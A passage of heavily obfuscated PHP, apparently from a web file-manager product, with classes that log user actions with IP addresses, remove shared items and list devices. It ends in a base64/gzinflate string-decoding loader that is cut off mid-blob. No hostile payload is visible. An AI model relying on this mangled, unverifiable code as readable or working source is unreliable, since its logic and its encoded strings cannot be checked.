Hook::trigger($²ì¬‡Íì[1781], array($²ì¬‡Íì[1284] => $‘¾Æ¹øß, $²ì¬‡Íì[1294] => !0)); show_json($¬Â……·, !1, 100111); } if ($ï§«­± == $²ì¬‡Íì[620]) { return !0; } if ($Ì¤Ãô¦ö || $î•¦ï¡¹) { $Ú¯²åõÔ = array_merge($Ì¤Ãô¦ö, $î•¦ï¡¹); $Ú¯²åõÔ = array_filter(array_unique($Ú¯²åõÔ)); $this->removeByFileID($Ú¯²åõÔ); } if ($ìÎüçğà) { $ìÎüçğà = array_filter(array_unique($ìÎüçğà)); foreach ($ìÎüçğà as $·üô˜Ÿ) { $û¬Ÿ—„¢ = IO::has($·üô˜Ÿ, !0); if (!$û¬Ÿ—„¢[$²ì¬‡Íì[239]] && !$û¬Ÿ—„¢[$²ì¬‡Íì[240]]) { IO::remove($·üô˜Ÿ); } } } return $this->remove($´ë¶‡ä§); } private function removeByFileID($ë¼ìñà† = array()) { $ƒ‘‹ˆ¿‰ =& $_SERVER[¢ñàß¿€]; if (empty($ë¼ìñà†)) { return; } $‘¢„Öüç = array($ƒ‘‹ˆ¿‰[541] => array($ƒ‘‹ˆ¿‰[7], $ë¼ìñà†)); $šÇŒÍ×“ = Model($ƒ‘‹ˆ¿‰[1414])->where($‘¢„Öüç)->field($ƒ‘‹ˆ¿‰[193])->select(); if (!$šÇŒÍ×“) { return Model($ƒ‘‹ˆ¿‰[544])->remove($ë¼ìñà†); } $šÇŒÍ×“ = array_to_keyvalue($šÇŒÍ×“, $ƒ‘‹ˆ¿‰[12], $ƒ‘‹ˆ¿‰[193]); foreach ($šÇŒÍ×“ as $¡ú©áÁé) { Model($ƒ‘‹ˆ¿‰[895])->removeNow($¡ú©áÁé, !1); } } private function removeShareItems($£Óç»çû) { $úóÃ’•í =& $_SERVER[¢ñàß¿€]; $§Öö‘Í = "\173\x69\x6f\72{$£Óç»çû}\x7d\x2f"; $äÀã³³Á = array($úóÃ’•í[193] => 0, $úóÃ’•í[1254] => array($úóÃ’•í[459], "{$§Öö‘Í}\x25")); $Ú™àÎ–Ã = Model($úóÃ’•í[1948])->where($äÀã³³Á)->field($úóÃ’•í[665])->select(); if (empty($Ú™àÎ–Ã)) { return; } $Òµ›’§ = array_to_keyvalue($Ú™àÎ–Ã, $úóÃ’•í[12], $úóÃ’•í[665]); Model($úóÃ’•í[664])->remove($Òµ›’§); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x4c\151\x67\150\x74\101\160\x70"; public $modelType = "\123\171\x73\164\145\155\x4f\x70\164\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\157\x75\160", "\x64\x65\x73\143", "\x63\157\x6e\164\145\x6e\164"); public function listData($´”ø¡Íó = false, $îÈÁ“”‡ = "\155\157\144\151\x66\x79\x54\x69\155\x65", $Ö—¨›šÚ = true) { return parent::listData($´”ø¡Íó, $îÈÁ“”‡, $Ö—¨›šÚ); } public function remove($¾ÌõÀ¥ß) { $šü¬…û = $this->findByName($¾ÌõÀ¥ß); if (!$šü¬…û) { return !1; } return parent::remove($šü¬…û[$_SERVER[¢ñàß¿€][475]]); } public function add($–¢Â²ë…) { if ($this->findByName($–¢Â²ë…[$_SERVER[¢ñàß¿€][32]])) { return !1; } return parent::insert($–¢Â²ë…); } public function update($´Ó‘Äç¶, $“µ‘í²) { $‘©ŠÆ¡£ =& $_SERVER[¢ñàß¿€]; $ã¥¨ÏĞ‰ = $this->findByName($´Ó‘Äç¶); $üŠÌîÏ€ = $this->findByName($“µ‘í²[$‘©ŠÆ¡£[32]]); if (!$ã¥¨ÏĞ‰ || $üŠÌîÏ€ && $üŠÌîÏ€[$‘©ŠÆ¡£[475]] != $ã¥¨ÏĞ‰[$‘©ŠÆ¡£[475]]) { return !1; } return parent::update($ã¥¨ÏĞ‰[$‘©ŠÆ¡£[475]], $“µ‘í²); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\x69\x6d\145", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74", "\146\x75\156\143\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ò¶‡úõ‹ =& $_SERVER[¢ñàß¿€]; return array($Ò¶‡úõ‹[2328] => LNG($Ò¶‡úõ‹[2329]), $Ò¶‡úõ‹[2330] => LNG($Ò¶‡úõ‹[2331]), $Ò¶‡úõ‹[1911] => LNG($Ò¶‡úõ‹[2332]), $Ò¶‡úõ‹[2333] => LNG($Ò¶‡úõ‹[2334]), $Ò¶‡úõ‹[2335] => LNG($Ò¶‡úõ‹[2336]), $Ò¶‡úõ‹[2337] => LNG($Ò¶‡úõ‹[2338]), $Ò¶‡úõ‹[2339] => LNG($Ò¶‡úõ‹[2340]), $Ò¶‡úõ‹[1941] => LNG($Ò¶‡úõ‹[2340]), $Ò¶‡úõ‹[1942] => LNG($Ò¶‡úõ‹[2341]), $Ò¶‡úõ‹[2342] => LNG($Ò¶‡úõ‹[2343]), $Ò¶‡úõ‹[2344] => LNG($Ò¶‡úõ‹[2345]), $Ò¶‡úõ‹[2346] => LNG($Ò¶‡úõ‹[2347]), $Ò¶‡úõ‹[2348] => LNG($Ò¶‡úõ‹[2349]), $Ò¶‡úõ‹[1939] => LNG($Ò¶‡úõ‹[2350]), $Ò¶‡úõ‹[2351] => LNG($Ò¶‡úõ‹[2352]), $Ò¶‡úõ‹[1946] => LNG($Ò¶‡úõ‹[2353]), $Ò¶‡úõ‹[2354] => LNG($Ò¶‡úõ‹[2355]), $Ò¶‡úõ‹[2356] => LNG($Ò¶‡úõ‹[2357]), $Ò¶‡úõ‹[2358] => LNG($Ò¶‡úõ‹[2359]), $Ò¶‡úõ‹[2360] => LNG($Ò¶‡úõ‹[2361]), $Ò¶‡úõ‹[1949] => LNG($Ò¶‡úõ‹[2362]), $Ò¶‡úõ‹[1950] => LNG($Ò¶‡úõ‹[2363]), $Ò¶‡úõ‹[2364] => LNG($Ò¶‡úõ‹[2365]), $Ò¶‡úõ‹[2366] => LNG($Ò¶‡úõ‹[2367]), $Ò¶‡úõ‹[2368] => LNG($Ò¶‡úõ‹[2369]), $Ò¶‡úõ‹[1944] => LNG($Ò¶‡úõ‹[2370]), $Ò¶‡úõ‹[2371] => LNG($Ò¶‡úõ‹[2372]), $Ò¶‡úõ‹[1943] => LNG($Ò¶‡úõ‹[2373]), $Ò¶‡úõ‹[2374] => LNG($Ò¶‡úõ‹[2375]), $Ò¶‡úõ‹[2376] => LNG($Ò¶‡úõ‹[2377]), $Ò¶‡úõ‹[2378] => LNG($Ò¶‡úõ‹[2377]), $Ò¶‡úõ‹[2379] => LNG($Ò¶‡úõ‹[2380]), $Ò¶‡úõ‹[2381] => LNG($Ò¶‡úõ‹[2381]), $Ò¶‡úõ‹[2382] => LNG($Ò¶‡úõ‹[1915]), $Ò¶‡úõ‹[2383] => LNG($Ò¶‡úõ‹[2384]), $Ò¶‡úõ‹[2385] => LNG($Ò¶‡úõ‹[2386]), $Ò¶‡úõ‹[2387] => LNG($Ò¶‡úõ‹[2388]), $Ò¶‡úõ‹[2389] => LNG($Ò¶‡úõ‹[2390]), $Ò¶‡úõ‹[2391] => LNG($Ò¶‡úõ‹[2392]), $Ò¶‡úõ‹[2393] => LNG($Ò¶‡úõ‹[2393]), $Ò¶‡úõ‹[2394] => LNG($Ò¶‡úõ‹[2395]), $Ò¶‡úõ‹[2396] => LNG($Ò¶‡úõ‹[2397]), $Ò¶‡úõ‹[2398] => LNG($Ò¶‡úõ‹[2399]), $Ò¶‡úõ‹[2400] => LNG($Ò¶‡úõ‹[2401]), $Ò¶‡úõ‹[2402] => LNG($Ò¶‡úõ‹[2403]), $Ò¶‡úõ‹[2404] => LNG($Ò¶‡úõ‹[2405]), $Ò¶‡úõ‹[212] => LNG($Ò¶‡úõ‹[212]), $Ò¶‡úõ‹[213] => LNG($Ò¶‡úõ‹[2406]), $Ò¶‡úõ‹[2407] => LNG($Ò¶‡úõ‹[2407])); } private function typeFile() { $šÊ‰¯µı =& $_SERVER[¢ñàß¿€]; $ìõê½ûë = array($šÊ‰¯µı[1946] => array($šÊ‰¯µı[1947]), $šÊ‰¯µı[2346] => array($šÊ‰¯µı[2408]), $šÊ‰¯µı[2348] => array($šÊ‰¯µı[2409]), $šÊ‰¯µı[1939] => array($šÊ‰¯µı[1940], $šÊ‰¯µı[2410]), $šÊ‰¯µı[2356] => array(), $šÊ‰¯µı[2358] => array(), $šÊ‰¯µı[2360] => array(), $šÊ‰¯µı[1949] => array($šÊ‰¯µı[1951]), $šÊ‰¯µı[1950] => array($šÊ‰¯µı[1951]), $šÊ‰¯µı[2364] => array($šÊ‰¯µı[2411]), $šÊ‰¯µı[2366] => array($šÊ‰¯µı[2411]), $šÊ‰¯µı[2368] => array($šÊ‰¯µı[2412]), $šÊ‰¯µı[2354] => array($šÊ‰¯µı[2413]), $šÊ‰¯µı[1944] => array($šÊ‰¯µı[2414]), $šÊ‰¯µı[2371] => array($šÊ‰¯µı[2415]), $šÊ‰¯µı[1943] => array($šÊ‰¯µı[1945])); return $ìõê½ûë; } private function typeAll() { $ŠÁÆìÂÉ =& $_SERVER[¢ñàß¿€]; $àğ’‘Êù = $this->typeList; $ÇŠÇÜøª = array_filter($this->typeFile()); foreach ($ÇŠÇÜøª as $¨¢á¤ï => $¥¢¼¨ö) { $àğ’‘Êù[$¥¢¼¨ö[0]] = $àğ’‘Êù[$¨¢á¤ï]; } $àğ’‘Êù[$ŠÁÆìÂÉ[1951]] = LNG($ŠÁÆìÂÉ[2416]); $àğ’‘Êù[$ŠÁÆìÂÉ[2411]] = LNG($ŠÁÆìÂÉ[2417]); return $àğ’‘Êù; } public function addLog($ï ×êğ„, $ÅŞ‚ó˜ = array()) { $Ä¢õ®¥Ù =& $_SERVER[¢ñàß¿€]; if (!isset($this->typeList[$ï ×êğ„])) { return; } $Ø”µ´¥à = Session::get($Ä¢õ®¥Ù[2109]); if (!$Ø”µ´¥à) { $Ø”µ´¥à = _get($ÅŞ‚ó˜, $Ä¢õ®¥Ù[1770], 0); } if ($ï ×êğ„ == $Ä¢õ®¥Ù[2383] && is_array($ÅŞ‚ó˜[$Ä¢õ®¥Ù[2418]]) && !$ÅŞ‚ó˜[$Ä¢õ®¥Ù[2418]]) { return; } $¯û öÂ† = get_client_ip(); if (!$ÅŞ‚ó˜ || strlen(json_encode($ÅŞ‚ó˜)) >= 1024 * 64) { if ($ÅŞ‚ó˜ && is_array($ÅŞ‚ó˜)) { $ÅŞ‚ó˜ = array_intersect_key($ÅŞ‚ó˜, array_flip($Ä¢õ®¥Ù[475], $Ä¢õ®¥Ù[32])); $ÅŞ‚ó˜[$Ä¢õ®¥Ù[2419]] = $¯û öÂ†; } else { $ÅŞ‚ó˜ = array($Ä¢õ®¥Ù[2419] => $¯û öÂ†); } } else { if (is_array($ÅŞ‚ó˜)) { $ÅŞ‚ó˜[$Ä¢õ®¥Ù[2419]] = $¯û öÂ†; } else { $ÅŞ‚ó˜ = array($Ä¢õ®¥Ù[1284] => $ÅŞ‚ó˜, $Ä¢õ®¥Ù[2419] => $¯û öÂ†); } } $ÅŞ‚ó˜ = array($Ä¢õ®¥Ù[1760] => Session::sign(), $Ä¢õ®¥Ù[1761] => intval($Ø”µ´¥à), $Ä¢õ®¥Ù[33] => $ï ×êğ„, $Ä¢õ®¥Ù[1763] => json_encode($ÅŞ‚ó˜)); parent::add($ÅŞ‚ó˜); } public function remove($üéªÀ‚) { $this->where(array($_SERVER[¢ñàß¿€][493] => $üéªÀ‚))->delete(); } private function _makeOrder($‚‘×ëŸ« = '') { $ËÉÑ’‹È =& $_SERVER[¢ñàß¿€]; $°·æèÏ = $ËÉÑ’‹È[231]; $Èø‘õğø = array($ËÉÑ’‹È[523] => $ËÉÑ’‹È[524], $ËÉÑ’‹È[525] => $ËÉÑ’‹È[526]); $Ûø®â–¦ = Input::get($ËÉÑ’‹È[531], $ËÉÑ’‹È[7], $ËÉÑ’‹È[2145], array($ËÉÑ’‹È[2063], $ËÉÑ’‹È[525])); $Ûø®â–¦ = $Èø‘õğø[$Ûø®â–¦]; $‚‘×ëŸ« = $‚‘×ëŸ« . "{$°·æèÏ}\40{$Ûø®â–¦}"; return $this->order($‚‘×ëŸ«); } public function get($Ì‰ÎÑ± = '') { $âÅ³„ë³ =& $_SERVER[¢ñàß¿€]; if (!$Ì‰ÎÑ±) { show_json(array()); } $ıÂÉä¸ª = array(); if ($Ì‰ÎÑ±[$âÅ³„ë³[1770]]) { $ıÂÉä¸ª[$âÅ³„ë³[1770]] = $Ì‰ÎÑ±[$âÅ³„ë³[1770]]; } if (isset($Ì‰ÎÑ±[$âÅ³„ë³[831]])) { $ıØášÄ = $Ì‰ÎÑ±[$âÅ³„ë³[831]]; $®üéÅ³Ğ = isset($Ì‰ÎÑ±[$âÅ³„ë³[832]]) ? $Ì‰ÎÑ±[$âÅ³„ë³[832]] : time(); $ıÂÉä¸ª[$âÅ³„ë³[231]] = array($âÅ³„ë³[409], array($ıØášÄ, $®üéÅ³Ğ)); } if ($Ì‰ÎÑ±[$âÅ³„ë³[33]]) { $§®³ÈËğ = explode($âÅ³„ë³[50], $Ì‰ÎÑ±[$âÅ³„ë³[33]]); $”É›ù¨˜ = $this->typeFile(); $“ú•‚Á– = array(); foreach ($§®³ÈËğ as $‘ÒÑ–´) { $“ú•‚Á–[] = $‘ÒÑ–´; if (isset($”É›ù¨˜[$‘ÒÑ–´])) { $“ú•‚Á– = array_merge($“ú•‚Á–, $”É›ù¨˜[$‘ÒÑ–´]); } } $“ú•‚Á– = array_unique($“ú•‚Á–); if ($“ú•‚Á–) { $ıÂÉä¸ª[$âÅ³„ë³[33]] = array($âÅ³„ë³[7], $“ú•‚Á–); } } else { $ıÂÉä¸ª[$âÅ³„ë³[33]] = array($âÅ³„ë³[2420], $âÅ³„ë³[2421]); } if (!empty($Ì‰ÎÑ±[$âÅ³„ë³[2419]])) { $ıÂÉä¸ª[$âÅ³„ë³[526]] = array($âÅ³„ë³[459], "\x25{$Ì‰ÎÑ±[$âÅ³„ë³[2419]]}\45"); } $Û¥¡¾’â = $this->_makeOrder()->where($ıÂÉä¸ª)->selectPage(); if (empty($Û¥¡¾’â[$âÅ³„ë³[445]])) { show_json(array(), !0, $Û¥¡¾’â[$âÅ³„ë³[442]]); } $Û¥¡¾’â[$âÅ³„ë³[445]] = $this->logList($Û¥¡¾’â[$âÅ³„ë³[445]]); return $Û¥¡¾’â; } private function ipAddress(&$§¼­‡ˆ“) { $ÏâŸÚÄ¡ =& $_SERVER[¢ñàß¿€]; if (!empty($§¼­‡ˆ“[$ÏâŸÚÄ¡[2419]])) { $·ù¹¦ƒ¾ = IpLocation::get($§¼­‡ˆ“[$ÏâŸÚÄ¡[2419]]); } else { $·ù¹¦ƒ¾ = LNG($ÏâŸÚÄ¡[2422]); } $§¼­‡ˆ“[$ÏâŸÚÄ¡[2423]] = $·ù¹¦ƒ¾; } private function descZipDownload($®†¯ôü, &$šÇõ‘š§) { $½âñ˜›õ =& $_SERVER[¢ñàß¿€]; if (!isset($®†¯ôü[$½âñ˜›õ[2424]])) { return; } $í¨Õ‹ø÷ = json_decode($®†¯ôü[$½âñ˜›õ[2424]], !0); foreach ($í¨Õ‹ø÷ as $±şğ˜Ì) { try { $éùªÈí™ = IO::infoFullSimple($±şğ˜Ì[$½âñ˜›õ[87]]); } catch (Exception $ñŸéî›) { continue; } $®†¯ôü[$½âñ˜›õ[87]] = $±şğ˜Ì[$½âñ˜›õ[87]]; $šÇõ‘š§[] = $®†¯ôü[$½âñ˜›õ[193]] = $éùªÈí™[$½âñ˜›õ[193]]; $šÇõ‘š§[] = $®†¯ôü[$½âñ˜›õ[2201]] = $éùªÈí™[$½âñ˜›õ[192]]; break; } return $®†¯ôü; } private function getSourceList(&$Âî—…ØÜ) { $ƒàıÇü =& $_SERVER[¢ñàß¿€]; $¶§°öÆ = array(); foreach ($Âî—…ØÜ as $µ¬áÖ‚¼ => $™Ú•Ñ°±) { $÷¨³ƒ…Ô = json_decode($™Ú•Ñ°±[$ƒàıÇü[526]], !0); if ($™Ú•Ñ°±[$ƒàıÇü[33]] == $ƒàıÇü[1942]) { $÷¨³ƒ…Ô = $this->descZipDownload($÷¨³ƒ…Ô, $¶§°öÆ); $Âî—…ØÜ[$µ¬áÖ‚¼][$ƒàıÇü[526]] = json_encode($÷¨³ƒ…Ô); continue; } if (strpos($™Ú•Ñ°±[$ƒàıÇü[33]], $ƒàıÇü[2203]) !== 0) { if (!isset($÷¨³ƒ…Ô[$ƒàıÇü[87]]) || strpos($™Ú•Ñ°±[$ƒàıÇü[33]], $ƒàıÇü[2425]) !== 0) { continue; } try { $ÜÊÇ¬€Ÿ = IO::infoFullSimple($÷¨³ƒ…Ô[$ƒàıÇü[87]]); } catch (Exception $™çÈéöÏ) { continue; } $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[193]] = $ÜÊÇ¬€Ÿ[$ƒàıÇü[193]]; $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[2201]] = $ÜÊÇ¬€Ÿ[$ƒàıÇü[192]]; $Âî—…ØÜ[$µ¬áÖ‚¼][$ƒàıÇü[526]] = json_encode($÷¨³ƒ…Ô); continue; } $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[193]]; $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[2201]]; if ($÷¨³ƒ…Ô[$ƒàıÇü[33]] == $ƒàıÇü[620]) { $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[526]][$ƒàıÇü[1238]]; $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[526]][$ƒàıÇü[1239]]; } if ($÷¨³ƒ…Ô[$ƒàıÇü[33]] == $ƒàıÇü[2212]) { $¶§°öÆ[] = $÷¨³ƒ…Ô[$ƒàıÇü[526]][$ƒàıÇü[193]]; } } if (!$¶§°öÆ) { return array(); } return Model($ƒàıÇü[895])->sourceListInfo($¶§°öÆ, !0); } private function logList($ÄÔ»úËÔ) { $›àòÓå¯ =& $_SERVER[¢ñàß¿€]; $–™‹½±ª = array_to_keyvalue($ÄÔ»úËÔ, $›àòÓå¯[12], $›àòÓå¯[1770]); $…˜Í ˆ = Model($›àòÓå¯[598])->userListInfo(array_unique($–™‹½±ª)); $Ø«„æÓ = $this->getSourceList($ÄÔ»úËÔ); $‚™ô©½ù = $this->typeAll(); $­û–ÃŞÁ = array(); $ŒÓóê¤å = array(); foreach ($ÄÔ»úËÔ as $ëÀÃ•Š => $Ö†Æ°àº) { $›ßÀº³Ñ = $Ö†Æ°àº[$›àòÓå¯[33]]; $×ëêÓ¤Ú = isset($…˜Í ˆ[$Ö†Æ°àº[$›àòÓå¯[1770]]]) ? $…˜Í ˆ[$Ö†Æ°àº[$›àòÓå¯[1770]]] : !1; $ÀùºÅòÃ = strpos($›ßÀº³Ñ, $›àòÓå¯[2426]) === 0 ? LNG($›àòÓå¯[2427]) : LNG($›àòÓå¯[2422]); $Ö†Æ°àº[$›àòÓå¯[32]] = isset($×ëêÓ¤Ú[$›àòÓå¯[32]]) ? $×ëêÓ¤Ú[$›àòÓå¯[32]] : LNG($›àòÓå¯[2422]); $Ö†Æ°àº[$›àòÓå¯[2256]] = isset($×ëêÓ¤Ú[$›àòÓå¯[2256]]) ? $×ëêÓ¤Ú[$›àòÓå¯[2256]] : $›àòÓå¯[12]; $Ö†Æ°àº[$›àòÓå¯[1659]] = isset($‚™ô©½ù[$›ßÀº³Ñ]) ? $‚™ô©½ù[$›ßÀº³Ñ] : $ÀùºÅòÃ; $Ö†Æ°àº[$›àòÓå¯[2144]] = $×ëêÓ¤Ú; $ÉàÄ¨§ö = json_decode($Ö†Æ°àº[$›àòÓå¯[526]], !0); $Ö†Æ°àº[$›àòÓå¯[2419]] = isset($ÉàÄ¨§ö[$›àòÓå¯[2419]]) ? $ÉàÄ¨§ö[$›àòÓå¯[2419]] : $›àòÓå¯[12]; $Ö†Æ°àº[$›àòÓå¯[2423]] = IpLocation::get($Ö†Æ°àº[$›àòÓå¯[2419]]); if (strpos($›ßÀº³Ñ, $›àòÓå¯[2203]) === 0 || isset($ÉàÄ¨§ö[$›àòÓå¯[2201]])) { $ÉàÄ¨§ö[$›àòÓå¯[90]] = $Ø«„æÓ[$ÉàÄ¨§ö[$›àòÓå¯[193]]]; $ÉàÄ¨§ö[$›àòÓå¯[2217]] = $Ø«„æÓ[$ÉàÄ¨§ö[$›àòÓå¯[2201]]]; if ($ÉàÄ¨§ö[$›àòÓå¯[33]] == $›àòÓå¯[620]) { $ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[1238]] = $Ø«„æÓ[$ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[1238]]]; $ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[1239]] = $Ø«„æÓ[$ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[1239]]]; } if ($ÉàÄ¨§ö[$›àòÓå¯[33]] == $›àòÓå¯[2212]) { $ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[193]] = $Ø«„æÓ[$ÉàÄ¨§ö[$›àòÓå¯[526]][$›àòÓå¯[193]]]; } if ($ÉàÄ¨§ö[$›àòÓå¯[33]] == $›àòÓå¯[1937]) { $ÉàÄ¨§ö[$›àòÓå¯[2217]] = $ÉàÄ¨§ö[$›àòÓå¯[90]]; $ÉàÄ¨§ö[$›àòÓå¯[2201]] = $ÉàÄ¨§ö[$›àòÓå¯[2217]][$›àòÓå¯[193]]; $ÉàÄ¨§ö[$›àòÓå¯[90]] = !1; $ÉàÄ¨§ö[$›àòÓå¯[193]] = $›àòÓå¯[12]; } $®ü™Ä¦ = array($›àòÓå¯[1937], $›àòÓå¯[2199]); if (!in_array($ÉàÄ¨§ö[$›àòÓå¯[33]], $®ü™Ä¦)) { if ($ÉàÄ¨§ö[$›àòÓå¯[90]] && $ÉàÄ¨§ö[$›àòÓå¯[90]][$›àòÓå¯[190]] == $›àòÓå¯[191]) { $ŒÓóê¤å[] = $Ö†Æ°àº[$›àòÓå¯[475]]; unset($ÄÔ»úËÔ[$ëÀÃ•Š]); continue; } if ($ÉàÄ¨§ö[$›àòÓå¯[2217]] && $ÉàÄ¨§ö[$›àòÓå¯[2217]][$›àòÓå¯[190]] == $›àòÓå¯[191]) { $ŒÓóê¤å[] = $Ö†Æ°àº[$›àòÓå¯[475]]; unset($ÄÔ»úËÔ[$ëÀÃ•Š]); continue; } } } $Ö†Æ°àº[$›àòÓå¯[526]] = $ÉàÄ¨§ö; unset($Ö†Æ°àº[$›àòÓå¯[2428]]); $­û–ÃŞÁ[] = $Ö†Æ°àº; } $this->clearSystemPathLog($ŒÓóê¤å); return $­û–ÃŞÁ; } private function clearSystemPathLog($¤Ş„³±ª) { $û²ğÛé =& $_SERVER[¢ñàß¿€]; if (count($¤Ş„³±ª) == 0) { return; } $ç‰€Š´ş = array($û²ğÛé[475] => array($û²ğÛé[7], array_unique($¤Ş„³±ª))); $this->where($ç‰€Š´ş)->delete(); } public function deviceList($Ö‰ø¼‚ô, $·ã€Ããš = 0) { $‚Ÿò†· =& $_SERVER[¢ñàß¿€]; $©ùïèÆ§ = array($‚Ÿò†·[1770] => $Ö‰ø¼‚ô, $‚Ÿò†·[231] => array($‚Ÿò†·[1089], $·ã€Ããš), $‚Ÿò†·[33] => $‚Ÿò†·[1911]); $‚ÆóØèŞ = array(); $–²œÎÌ¬ = $this->field($‚Ÿò†·[2429])->where($©ùïèÆ§)->order($‚Ÿò†·[2215])->limit(50)->select(); foreach ($–²œÎÌ¬ as $šñı÷×± => $óØ’ÛñÄ) { if ($šñı÷×± > 0 && abs($óØ’ÛñÄ[$‚Ÿò†·[231]] - $–²œÎÌ¬[$šñı÷×± - 1][$‚Ÿò†·[231]]) < 5) { continue; } $œŠõÏ“ = json_decode($óØ’ÛñÄ[$‚Ÿò†·[526]], !0); $óØ’ÛñÄ[$‚Ÿò†·[2419]] = isset($œŠõÏ“[$‚Ÿò†·[2419]]) ? $œŠõÏ“[$‚Ÿò†·[2419]] : $‚Ÿò†·[12]; unset($œŠõÏ“[$‚Ÿò†·[2419]]); $úË»–ÍØ = $this->deviceType($œŠõÏ“[$‚Ÿò†·[2204]]); if (isset($‚ÆóØèŞ[$úË»–ÍØ])) { continue; } $óØ’ÛñÄ[$‚Ÿò†·[2423]] = IpLocation::get($óØ’ÛñÄ[$‚Ÿò†·[2419]]); $óØ’ÛñÄ[$‚Ÿò†·[526]] = $œŠõÏ“; $‚ÆóØèŞ[$úË»–ÍØ] = $óØ’ÛñÄ; } return array_values($‚ÆóØèŞ); } public function deviceType($¤ÁŞ°Õ±) { return $¤ÁŞ°Õ±; } } goto BèÙÎ”ä¹˜; Fßà‹ç¥Û˜: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('ovHg37+A'), "\231\316\366\267\366\373"); $_SERVER[¢ñàß¿€] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x5b\xc5\xb5\x70\x21\xd0\x12\x5e\xa1\x94\x52\x4a\xb\x85\x1b\x93\x60\x3b\xd1\x62\x3b\xb\x89\x13\x27\xc8\xb2\x6c\x8b\xc8\x96\x91\xe4\x6c\xb6\xb9\xb9\x96"."\256\254\33\113\272\262\356\225\227\54\55\11\4\112\40\354\173\303\126\240\100\51\204\26\50\141\11\113\241\264\120\226\266\74\366\2\205\306\116\50\24\50\24\12\205\302\77\313\231\345\136\311"."\360\376\357\375\337\367\7\22\315\234\71\63\167\226\63\147\316\234\71\163\346\357\117\175\360\321\23\277\133\277\27\372\157\237\55\73\67\275\363\347\137\323\360\372\51\344\77\22\76\352\214\375"."\xbe\x42\xfe\x7c\xeb\x8c\x2d\x35\x35\xed\xf3\xf6\x9f\xd5\xf9\xf5\xb3\x6f\xbf\x59\xfb\xea\x83\x1f\x3d\x7c\xfb\xe3\xdb\xfe\xfb\x2f\x8f\xff\x2c\x91\x5a\x7c\xf7\xb6\x81\x23\xbf\x72\xcb\xbb\xdf\xb9\xa7\x11\x61\xd2".base64_decode('jI30R8mbtqKPGpZtUUDSzKeNARo28vTXT3+6Y5GinjNtnUZ99EeFSpF/raGswdLVzmhCjQ==')."\x77\x77\x75\x85\x62\x9\x40\x6a\x94\xd3\x73\x66\xa\x42\x5\xad\xa8\xe5\xe0\xfb\x5\xbd\x68\xa1\xda\xc8\xc5\xa9\x5\xb3\xa0\xe7\x1d\x10\x1\x48\x69\xb6\xd6\xaf\x59\x50\x52\x4b\xb3\xda\x12\xea\x8a\x44\x57\xaa"."\211\225\135\41\300\350\127\207\112\172\161\214\306\110\60\156\153\105\73\141\344\164\216\61\122\344\365\152\16\265\205\73\225\104\54\320\31\17\4\23\341\150\47\5\7\243\35\35\341\104\71\74"."\26\215\104\232\3\301\245\345\51\135\261\100\133\107\100\101\365\313\352\252\221\117\233\65\312\152\232\262\132\251\245\201\126\103\317\246\150\60\257\261\352\330\143\5\10\45\170\10\15\123\276\224"."\xcd\xd2\x48\x27\xf\xa5\xf4\xb4\x56\xca\x42\x6f\xb5\xc8\x91\x42\xd1\xc8\x69\xac\xd1\x4b\xf5\x31\xe\xa5\x1\xad\x64\x9b\x46\x3e\x49\x23\xa1\x51\xbb\xa8\x9\x38\xaa\x6b\x12\xd\xb4\x9e\x87\xa2\xe2\xa1\x48\x28"."\230\120\160\5\225\326\130\264\103\201\101\310\151\226\255\27\225\345\355\241\130\110\301\225\156\252\46\155\255\126\200\136\72\121\127\50\201\110\104\231\254\4\133\317\25\130\61\64\117\205\302\242".base64_decode('sZZQTGleqYgeSpq5nJn3oVLQSNpSVUOxGA14gLwjYTxoEIm2tsZDPAaNOyGCajIb6NMRSw==').strrev('°Ö°ÏÖúù	¿(rôAl1(VŸ&˜E'."\n".'d£yéi¯Àü5oéLŒKe¬:¶³¥')."\x80\x81\x66\xe8\x30\xd\x36\x2d\xa6\xbf\xb\x21\x7f\xbf\x8a\xd3\xf4\xa2\xad\xea\xf9\xa4\x99\x32\xf2\x30\x8f\x97\x0\x3d\x6a\x76\xa6\xa5\x68\x20\x4\x1a\x4f\x9b\xd9\x14\xb\x5b\xc6\x5a\x68\x65\xda\xc8\xea\x9d"."\xa5\x9c\x8c\xc2\xa3\xc9\x8c\x91\x4d\x15\xd9\xd4\xfb\x22\x4c\x1a\x8d\xf0\x99\x8c\x71\x45\xac\x80\x6a\xb2\x9e\x31\x1\x23\x3d\x26\xa6\x22\xc6\xeb\xe2\xa9\x96\x59\x2a\x26\xf5\x30\x9a\x3a\x34\x5e\xf\x60\xdd\xb6"."\x51\xe3\x58\x87\x98\xdd\x85\xac\xa9\xa5\xe2\x7a\x91\x37\xcd\x30\x5b\x51\x41\xd1\x92\x2d\x3\x4b\x4\xad\xd5\x2c\xe6\x5a\x10\xd3\x80\xef\xa3\x9\x63\x74\x57\x48\x18\x64\x53\x26\x25\xf5\x98\xbf\xa6\x67\xa3\xf7"."\263\276\236\343\320\77\265\300\25\173\241\116\31\75\233\125\365\121\35\346\124